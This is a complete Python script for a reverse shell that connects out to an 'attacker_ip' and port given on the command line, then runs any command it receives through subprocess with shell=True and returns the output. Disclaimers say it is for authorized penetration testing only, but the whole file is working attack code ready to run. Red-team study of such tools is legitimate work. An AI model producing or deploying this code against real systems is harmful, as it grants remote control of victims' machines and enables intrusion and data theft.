#!/usr/bin/env python3
"""
Simple Reverse Shell
WARNING: For authorized penetration testing only!
Usage: python3 reverse_shell.py <attacker_ip> <port>
"""

import socket
import subprocess
import sys
import os

def reverse_shell(host, port):
    """
    Establish a reverse shell connection to the attacker.
    """
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Send initial message
        s.send(b"[*] Reverse shell connected\n")

        # Shell loop
        while True:
            # Receive command
            command = s.recv(1024).decode().strip()

            if not command or command.lower() == 'exit':
                break

            # Execute command
            try:
                if command.startswith('cd '):
                    # Handle directory change
                    directory = command[3:].strip()
                    os.chdir(directory)
                    output = f"Changed directory to {os.getcwd()}\n"
                else:
                    # Execute command
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True
                    )
                    output = result.stdout + result.stderr

                if not output:
                    output = "[*] Command executed successfully (no output)\n"

            except Exception as e:
                output = f"[-] Error: {str(e)}\n"

            # Send output back
            s.send(output.encode())

        s.close()

    except Exception as e:
        print(f"[-] Error: {str(e)}")
        sys.exit(1)

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <attacker_ip> <port>")
        print(f"Example: {sys.argv[0]} 192.168.1.100 4444")
        print("\nWARNING: Use only with explicit authorization!")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print(f"[*] Connecting to {host}:{port}...")
    reverse_shell(host, port)

if __name__ == "__main__":
    main()
